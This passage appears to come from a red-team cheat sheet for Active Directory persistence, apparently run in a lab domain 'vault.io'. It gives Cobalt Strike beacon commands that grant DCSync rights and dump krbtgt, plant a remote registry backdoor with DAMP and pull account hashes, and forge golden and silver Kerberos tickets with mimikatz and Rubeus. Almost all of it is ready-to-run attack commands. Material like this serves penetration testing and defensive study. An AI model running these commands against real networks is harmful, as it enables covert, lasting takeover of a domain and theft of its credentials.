- https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition
- https://exploit.ph/revisiting-delegate-2-thyself.html

### DCSync Backdoor

```
# grant user DCSync rights
beacon> Add-DomainObjectAcl -TargetIdentity 'DC=vault,DC=io' -PrincipalIdentity 'r.blurr' -Rights DCSync
[...]

beacon> dcsync krbtgt
[...]
```

### Remote Registry Backdoor

```
# as DA
beacon> powershell-import /tools/DAMP/Add-RemoteRegBackdoor.ps1
beacon> powershell Add-RemoteRegBackdoor -ComputerName dc01 -Trustee vault\s.larken

# NTLM of computer account
beacon> powershell Get-RemoteMachineAccountHash -ComputerName dc01

# NTLM of local account
beacon> powershell Get-RemoteLocalAccountHash -ComputerName dc01
```

#### Resources
- https://github.com/HarmJ0y/DAMP

### Golden Tickets

```
# create
beacon> mimikatz kerberos::golden /user:administrator /domain:vault.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:ui23226a07bed6f9617e6eafe01apo87 /ticket:golden.kirbi

# imperonsate
beacon> execute-assembly /tools/Rubeus.exe ptt /ticket:golden.kirbi
[...]

# or
beacon> execute-assembly /tools/Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe
beacon> execute-assembly /tools/Rubeus.exe ptt /luid:0x24314fe /ticket:golden.kirbi
beacon> steal_token 6208
```

### Silver Ticket

```
beacon> mimikatz kerberos::golden /user:Administrator /domain:vault.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc01.vault.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
```

#### Resources
- https://adsecurity.org/?p=2011